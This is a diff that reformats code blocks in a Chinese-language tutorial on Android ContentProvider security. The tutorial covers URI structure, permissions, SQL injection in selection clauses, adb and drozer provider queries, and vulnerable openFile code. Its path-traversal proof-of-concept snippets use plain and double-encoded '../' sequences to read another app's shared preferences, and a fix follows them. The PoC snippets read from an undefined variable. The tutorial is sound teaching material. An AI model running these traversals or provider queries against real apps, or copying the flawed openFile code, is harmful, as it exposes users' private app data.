@@ -30,52 +30,59 @@ A. 标准前缀表明这个数据被一个ContentProvider所控制。它不会�
 
 B. URI的权限部分；它标识这个ContentProvider。对于第三方应用程序，这应该是一个全称类名（小写）以确保唯一性。权限在<provider>元素的权限属性中进行声明：
 
-		<provider name=".TransportationProvider"
-          authorities="com.example.transportationprovider"
-          . . .  >
+```
+<provider name=".TransportationProvider"
+  authorities="com.example.transportationprovider"
+  . . .  >
+```
 
 C. 用来判断请求数据类型的路径。这可以是0或多个段长。如果ContentProvider只暴露了一种数据类型（比如，只有火车），这个分段可以没有。如果提供器暴露若干类型，包括子类型，那它可以是多个分段长-例如，提供"land/bus", "land/train", "sea/ship", 和"sea/submarine"这4个可能的值。
 
 D. 被请求的特定记录的ID，如果有的话。这是被请求记录的_ID数值。如果这个请求不局限于单个记录， 这个分段和尾部的斜线会被忽略：
 
-		content://com.example.transportationprovider/trains
+```
+content://com.example.transportationprovider/trains
+```
 
 **ContentResolver**
 
 ContentResolver的方法们提供了对存储数据的基本的"CRUD" (增删改查)功能
 
+```java
+getIContentProvider() 
+      Returns the Binder object for this provider.
 
-	getIContentProvider() 
-          Returns the Binder object for this provider.
+delete(Uri uri, String selection, String[] selectionArgs) -----abstract
+      A request to delete one or more rows.
 
-	delete(Uri uri, String selection, String[] selectionArgs) -----abstract
-          A request to delete one or more rows.
+insert(Uri uri, ContentValues values) 
+      Implement this to insert a new row.
 
-	insert(Uri uri, ContentValues values) 
-          Implement this to insert a new row.
+query(Uri uri, String[] projection, String selection, String[] selectionArgs, String sortOrder) 
+      Receives a query request from a client in a local process, and returns a Cursor.
 
-	query(Uri uri, String[] projection, String selection, String[] selectionArgs, String sortOrder) 
-          Receives a query request from a client in a local process, and returns a Cursor.
+update(Uri uri, ContentValues values, String selection, String[] selectionArgs) 
+      Update a content URI.
 
-	update(Uri uri, ContentValues values, String selection, String[] selectionArgs) 
-          Update a content URI.
-
-	openFile(Uri uri, String mode) 
-          Open a file blob associated with a content URI.
-
+openFile(Uri uri, String mode) 
+      Open a file blob associated with a content URI.
+```
 
 **Sql注入**
 
 sql语句拼接
 
-	// 通过连接用户输入到列名来构造一个选择条款
-	String mSelectionClause =  "var = " + mUserInput;
+```
+// 通过连接用户输入到列名来构造一个选择条款
+String mSelectionClause =  "var = " + mUserInput;
+```
 
 参数化查询
 
-	// 构造一个带有占位符的选择条款
-	String mSelectionClause =  "var = ?";
-
+```
+// 构造一个带有占位符的选择条款
+String mSelectionClause =  "var = ?";
+```
 
 **权限**
 
@@ -96,13 +103,17 @@ sql语句拼接
 
 下面的<uses-permission> 元素请求对用户词典的读权限：
 
-    <uses-permission android:name="android.permission.READ_USER_DICTIONARY">
+```
+<uses-permission android:name="android.permission.READ_USER_DICTIONARY">
+```
 
 申请某些protectionLevel="dangerous"的权限
 
-	<uses-permission android:name="com.huawei.dbank.v7.provider.DBank.READ_DATABASE"/>
+```
+<uses-permission android:name="com.huawei.dbank.v7.provider.DBank.READ_DATABASE"/>
 
-    <permission android:name="com.huawei.dbank.v7.provider.DBank.READ_DATABASE" android:protectionLevel="dangerous"></permission>
+<permission android:name="com.huawei.dbank.v7.provider.DBank.READ_DATABASE" android:protectionLevel="dangerous"></permission>
+```
 
 android:protectionLevel
 
@@ -137,8 +148,10 @@ Contentprovider组件在API-17（android4.2）及以上版本由以前的exporte
 
 Contentprovider无法在android2.2（API-8）申明为私有。
 
+```
 	<!-- *** POINT 1 *** Do not (Cannot) implement Private Content Provider in Android 2.2 (API Level 8) or earlier. -->
 	<uses-sdk android:minSdkVersion="9" android:targetSdkVersion="17" />
+```
 
 **关键方法**
 
@@ -187,17 +200,19 @@ Contentprovider无法在android2.2（API-8）申明为私有。
 
 3、确定authority和path后根据业务编写POC、使用drozer、使用小工具Content Provider Helper、adb shell // 没有对应权限会提示错误
 	
-	adb shell：
-	adb shell content query --uri <URI> [--user <USER_ID>] [--projection <PROJECTION>] [--where <WHERE>] [--sort <SORT_ORDER>]
-	content query --uri content://settings/secure --projection name:value --where "name='new_setting'" --sort "name ASC"
-	adb shell content insert --uri content://settings/secure --bind name:s:new_setting --bind value:s:new_value
-	adb shell content update --uri content://settings/secure --bind value:s:newer_value --where "name='new_setting'"
-	adb shell content delete --uri content://settings/secure --where "name='new_setting'"
-	
+```	
+adb shell：
+adb shell content query --uri <URI> [--user <USER_ID>] [--projection <PROJECTION>] [--where <WHERE>] [--sort <SORT_ORDER>]
+content query --uri content://settings/secure --projection name:value --where "name='new_setting'" --sort "name ASC"
+adb shell content insert --uri content://settings/secure --bind name:s:new_setting --bind value:s:new_value
+adb shell content update --uri content://settings/secure --bind value:s:newer_value --where "name='new_setting'"
+adb shell content delete --uri content://settings/secure --where "name='new_setting'"
+
 <!--content query -–uri content://com.yulong.android.ntfcationmanager.provider/ntfpkgperm -->
-	
-	drozer：
-	run app.provider.query content://telephony/carriers/preferapn --vertical
+
+drozer：
+run app.provider.query content://telephony/carriers/preferapn --vertical
+```
 
 ## 0x05 案例
 
@@ -233,55 +248,64 @@ Override openFile method
 
 错误写法1：
 
-		private static String IMAGE_DIRECTORY = localFile.getAbsolutePath();
-		public ParcelFileDescriptor openFile(Uri paramUri, String paramString)
-		    throws FileNotFoundException {
-		  File file = new File(IMAGE_DIRECTORY, paramUri.getLastPathSegment());
-		  return ParcelFileDescriptor.open(file, ParcelFileDescriptor.MODE_READ_ONLY);
-		}
+```java
+private static String IMAGE_DIRECTORY = localFile.getAbsolutePath();
+public ParcelFileDescriptor openFile(Uri paramUri, String paramString)
+    throws FileNotFoundException {
+  File file = new File(IMAGE_DIRECTORY, paramUri.getLastPathSegment());
+  return ParcelFileDescriptor.open(file, ParcelFileDescriptor.MODE_READ_ONLY);
+}
+```
 
 错误写法2：URI.parse()
 
-		private static String IMAGE_DIRECTORY = localFile.getAbsolutePath();
-		  public ParcelFileDescriptor openFile(Uri paramUri, String paramString)
-		      throws FileNotFoundException {
-		    File file = new File(IMAGE_DIRECTORY, Uri.parse(paramUri.getLastPathSegment()).getLastPathSegment());
-		    return ParcelFileDescriptor.open(file, ParcelFileDescriptor.MODE_READ_ONLY);
-		  }
+```java
+private static String IMAGE_DIRECTORY = localFile.getAbsolutePath();
+  public ParcelFileDescriptor openFile(Uri paramUri, String paramString)
+      throws FileNotFoundException {
+    File file = new File(IMAGE_DIRECTORY, Uri.parse(paramUri.getLastPathSegment()).getLastPathSegment());
+    return ParcelFileDescriptor.open(file, ParcelFileDescriptor.MODE_READ_ONLY);
+  }
+```
 
 POC1：
 
-	String target = "content://com.example.android.sdk.imageprovider/data/" + "..%2F..%2F..%2Fdata%2Fdata%2Fcom.example.android.app%2Fshared_prefs%2FExample.xml";
- 
-	ContentResolver cr = this.getContentResolver();
-	FileInputStream fis = (FileInputStream)cr.openInputStream(Uri.parse(target));
- 
-	byte[] buff = new byte[fis.available()];
-	in.read(buff);
+```java
+String target = "content://com.example.android.sdk.imageprovider/data/" + "..%2F..%2F..%2Fdata%2Fdata%2Fcom.example.android.app%2Fshared_prefs%2FExample.xml";
+
+ContentResolver cr = this.getContentResolver();
+FileInputStream fis = (FileInputStream)cr.openInputStream(Uri.parse(target));
+
+byte[] buff = new byte[fis.available()];
+in.read(buff);
+```
 
 POC2：double encode
 
-	String target = "content://com.example.android.sdk.imageprovider/data/" + "%252E%252E%252F%252E%252E%252F%252E%252E%252Fdata%252Fdata%252Fcom.example.android.app%252Fshared_prefs%252FExample.xml";
- 
-	ContentResolver cr = this.getContentResolver();
-	FileInputStream fis = (FileInputStream)cr.openInputStream(Uri.parse(target));
- 
-	byte[] buff = new byte[fis.available()];
-	in.read(buff);
+```java
+String target = "content://com.example.android.sdk.imageprovider/data/" + "%252E%252E%252F%252E%252E%252F%252E%252E%252Fdata%252Fdata%252Fcom.example.android.app%252Fshared_prefs%252FExample.xml";
+
+ContentResolver cr = this.getContentResolver();
+FileInputStream fis = (FileInputStream)cr.openInputStream(Uri.parse(target));
+
+byte[] buff = new byte[fis.available()];
+in.read(buff);
+```
 
 解决方法Uri.decode()
 
-	private static String IMAGE_DIRECTORY = localFile.getAbsolutePath();
-	  public ParcelFileDescriptor openFile(Uri paramUri, String paramString)
-	      throws FileNotFoundException {
-	    String decodedUriString = Uri.decode(paramUri.toString());
-	    File file = new File(IMAGE_DIRECTORY, Uri.parse(decodedUriString).getLastPathSegment());
-	    if (file.getCanonicalPath().indexOf(localFile.getCanonicalPath()) != 0) {
-	      throw new IllegalArgumentException();
-	    }
-	    return ParcelFileDescriptor.open(file, ParcelFileDescriptor.MODE_READ_ONLY);
-	  }
-
+```java
+private static String IMAGE_DIRECTORY = localFile.getAbsolutePath();
+  public ParcelFileDescriptor openFile(Uri paramUri, String paramString)
+      throws FileNotFoundException {
+    String decodedUriString = Uri.decode(paramUri.toString());
+    File file = new File(IMAGE_DIRECTORY, Uri.parse(decodedUriString).getLastPathSegment());
+    if (file.getCanonicalPath().indexOf(localFile.getCanonicalPath()) != 0) {
+      throw new IllegalArgumentException();
+    }
+    return ParcelFileDescriptor.open(file, ParcelFileDescriptor.MODE_READ_ONLY);
+  }
+```
 ## 0x06 参考
 
 ----------
